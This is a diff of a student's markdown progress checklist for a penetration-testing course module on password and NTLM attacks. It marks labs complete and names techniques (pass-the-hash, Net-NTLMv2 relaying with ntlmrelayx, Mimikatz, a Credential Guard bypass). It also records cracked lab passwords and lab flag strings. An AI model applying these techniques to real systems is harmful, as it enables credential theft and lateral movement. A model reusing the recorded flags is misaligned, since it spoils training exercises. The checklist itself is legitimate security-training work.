 - [x] **16.2.5 SSH Private Key Passphrase:** done (ssh2john, Hashcat mode 22921, aes-256-ctr JtR fallback, hands-on pending)
 - [x] **16.3.1 Cracking NTLM:** done (SAM, SYSKEY, LM vs NTLM, Mimikatz privilege chain, mode 1000, hands-on pending)
-- [x] **16.3.2 Passing NTLM:** done (PtH mechanics, UAC remote restrictions, smbclient/psexec/wmiexec, hands-on pending)
-- [x] **16.3.3 Cracking Net-NTLMv2:** done (challenge-response diagram, Responder, mode 5600, LLMNR poisoning note, hands-on pending)
-- [x] **16.3.4 Relaying Net-NTLMv2:** done (relay attack sequence diagram, ntlmrelayx, hands-on pending)
+- [x] **16.3.2 Passing NTLM:** done (PtH mechanics, UAC remote restrictions, smbclient/psexec/wmiexec, lab complete -- bind shell entry, schtasks Mimikatz workaround, PtH to FILES02)
+- [x] **16.3.3 Cracking Net-NTLMv2:** done (challenge-response diagram, Responder, mode 5600, LLMNR poisoning note, VM #1 lab complete -- paul:123Password123, OS{fbba4d3334de37e8ab70fc0b4fc87f2c}; VM #2 lab complete -- UNC filename injection, sam:DISISMYPASSWORD, OS{fd4c2c2822477f7330c3bcc67ca16e53})
+- [x] **16.3.4 Relaying Net-NTLMv2:** done (relay attack sequence diagram, ntlmrelayx, VM Group 1 complete -- files02admin PtH, OS{0360d5711918d92ad7fe85787d2502ef}; VM Group 2 capstone complete -- Beta App PowerShell relay, anastasia, OS{060aee7f5fd9ddc5797feed6910379b9})
 - [x] **16.3.5 Windows Credential Guard:** done (VBS/VSM/VTL architecture diagram, memssp bypass, mimilsa.log, all 4 quiz answers)
 - [x] **16.4 Wrapping Up:** done (decision flowchart, external resources)
 
-**Module 16 theory and quiz answers are fully written. All hands-on labs remain pending (VM spin-up required). Ready to begin hands-on labs per [[feedback_oscp_lab_workflow]].**
+**Module 16 fully complete. All hands-on labs done: 16.1.1 SSH ✅, 16.1.2 RDP+FTP ✅, 16.1.3 HTTP POST+Basic ✅, 16.2.2 hash cracking ✅, 16.2.4 KeePass ✅, 16.2.5 SSH key ✅, 16.3.1 NTLM cracking ✅, 16.3.2 PtH ✅, 16.3.3 Net-NTLMv2 cracking VM #1 ✅, 16.3.3 Net-NTLMv2 cracking VM #2 ✅, 16.3.4 Relaying VM Group 1 ✅, 16.3.4 Relaying VM Group 2 (capstone) ✅, 16.3.5 Credential Guard memssp ✅. Solo enrichment pass and hub-doc sync still to do.**
